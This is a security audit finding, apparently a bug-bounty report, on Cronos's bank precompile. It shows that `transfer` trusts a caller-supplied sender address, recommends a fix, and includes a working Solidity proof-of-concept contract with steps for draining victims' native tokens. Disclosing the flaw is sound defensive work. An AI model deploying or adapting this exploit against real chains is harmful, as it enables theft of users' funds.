### Title
Bank Precompile `transfer` Allows Unauthorized Native Token Drain from Arbitrary Addresses — (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the `BankContract` precompile accepts a caller-supplied `sender` address without verifying it equals `contract.Caller()`. Because the underlying `bankKeeper.SendCoins` enforces no authorization of its own, any malicious EVM contract can transfer `evm/0x{contract}` native tokens out of any victim address that holds them, with no consent from the victim.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` branch unpacks `sender` and `recipient` directly from the ABI-encoded call data:

```go
sender    := args[0].(common.Address)   // ← fully attacker-controlled
recipient := args[1].(common.Address)
...
denom := EVMDenom(contract.Caller())    // evm/0x<callingContract>
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
    ...
    if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
        return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
    }
    return nil
})
```

There is **no check** that `sender == contract.Caller()`. The Cosmos SDK `bankKeeper.SendCoins` is a low-level primitive that moves coins between accounts without performing any signer/authorization check — that responsibility is delegated entirely to the caller. The bank precompile omits it.

The `mint` path (same file, `MintMethodName`) correctly uses `contract.Caller()` as the implicit issuer, and the intended usage shown in `TestBank.sol` always passes `msg.sender` as the sender:

```solidity
function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(msg.sender, recipient, amount);          // EVM-level auth
    return bank.transfer(msg.sender, recipient, amount); // native mirror
}
```

A malicious contract can skip the EVM-level authorization entirely and pass any victim address as `sender`.

---

### Impact Explanation

**High — Unauthorized transfer of native tokens.**

`evm/0x{contract}` tokens are real Cosmos-layer native assets tracked by the bank module. Any contract that has previously minted these tokens to users (e.g., as part of a DeFi protocol, liquidity pool, or reward mechanism) can later call `bank.transfer(victimAddress, attackerAddress, amount)` to drain those tokens from the victim with no approval. This breaks the accounting invariant that native `evm/` balances should only move when the EVM-level token also moves, and constitutes an unauthorized transfer of protocol-controlled assets.

---

### Likelihood Explanation

**Medium.** The attack requires victims to hold `evm/0x{maliciousContract}` tokens. This is realistic in any DeFi scenario where a contract mints its native representation to users (collateral, LP shares, rewards). The attacker controls the contract and can time the drain at will after users have accumulated balances.

---

### Recommendation

Add an authorization check in the `TransferMethodName` branch to ensure the `sender` is the calling contract:

```go
case TransferMethodName:
    ...
    sender    := args[0].(common.Address)
    recipient := args[1].(common.Address)
    ...
+   if sender != contract.Caller() {
+       return nil, errors.New("bank transfer: sender must be the calling contract")
+   }
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
```

This mirrors the authorization model already implicit in `mint`/`burn` (which derive the denom from `contract.Caller()` and act on the caller's behalf).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract MaliciousBank {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/0x<this> tokens to victim as part of a "protocol"
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/0x<this> native tokens with no approval
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller is this contract — no auth check in precompile
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `MaliciousBank`.
2. Calls `seedVictim(victim, 1000)` — victim now holds 1000 `evm/0x<MaliciousBank>` native tokens.
3. Calls `drain(victim, attacker, 1000)` — precompile executes `SendCoins(victim, attacker, 1000 evm/0x<MaliciousBank>)` with no authorization check.
4. Victim's native token balance is zeroed; attacker holds 1000 tokens.

The root cause is at [1](#0-0)  — `sender` is taken from caller input and passed directly to `SendCoins` without verifying `sender == contract.Caller()`. The `denom` derivation at [2](#0-1)  correctly scopes the token to the calling contract, but the missing sender check at [3](#0-2)  allows the calling contract to move tokens from any holder of that denom.
